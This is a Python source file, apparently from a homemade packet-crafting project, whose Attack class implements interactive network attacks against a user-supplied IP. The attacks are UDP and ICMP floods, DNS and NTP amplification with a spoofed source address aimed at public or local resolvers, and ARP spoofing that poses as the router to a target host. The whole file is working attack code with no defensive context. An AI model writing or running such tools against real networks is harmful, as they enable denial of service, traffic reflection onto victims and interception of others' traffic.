from protocols.udp import UDP
from protocols.icmp import ICMP
from protocols.ipv4 import IPv4
from protocols.dns import DNS
from protocols.ntp import NTP
from protocols.ethernet import Ethernet
from protocols.arp import ARP
from network import Network
import random


class Attack:

    @staticmethod
    def udp_flood():
        dst_ip = input("Enter IP address to flood: ")
        for i in range(10):
            pkt = IPv4(dst_ip=dst_ip).add_protocol(
                UDP(dst_port=random.randint(1, 65535))
            )
            Network.send_only(pkt)

    @staticmethod
    def icmp_flood():
        dst_ip = input("Enter IP address to flood: ")
        for i in range(10):
            pkt = IPv4(dst_ip=dst_ip).add_protocol(ICMP())
            Network.send_only(pkt)

    @staticmethod
    def dns_amplification():
        dst_ip = input("Enter IP address to amplification: ")
        for i in range(10):
            pkt = IPv4(src_ip=dst_ip, dst_ip="8.8.8.8").add_protocol(
                UDP(dst_port=53).add_protocol(DNS("youtube.com"))
            )
            Network.send_only(pkt)

    @staticmethod
    def ntp_amplification():
        dst_ip = input("Enter IP address to amplification: ")
        for i in range(10):
            pkt = IPv4(src_ip=dst_ip, dst_ip="192.168.1.149").add_protocol(
                UDP(dst_port=123).add_protocol(
                    NTP(mode=6, opcode=1, sequence=10, association_id=0, data=b"system")
                )
            )
            Network.send_only(pkt)

    @staticmethod
    def arp_spoofing():
        dst_ip = input("Enter IP address to spoof: ")
        router_ip = input("Enter router IP address: ")

        request = Ethernet(type=0x0806).add_protocol(ARP(target_ip=dst_ip))
        answer = Network.send_and_received(request)

        if answer.payload is None or not hasattr(answer.payload, "packet"):
            print(f"No ARP reply received for {dst_ip}.")
            return

        reply = answer.payload.packet
        if reply.get("operation") != 2 or reply.get("sender_ip") != dst_ip:
            print(f"Got a response, but it wasn't a matching ARP reply for {dst_ip}.")
            return

        target_mac = reply["sender_mac"]

        for i in range(10):
            spoof = Ethernet(type=0x0806, dst_mac_addr=target_mac).add_protocol(
                ARP(
                    sender_ip=router_ip,
                    target_ip=dst_ip,
                    target_mac=target_mac,
                    operation=2,
                )
            )
            Network.send_only(spoof)
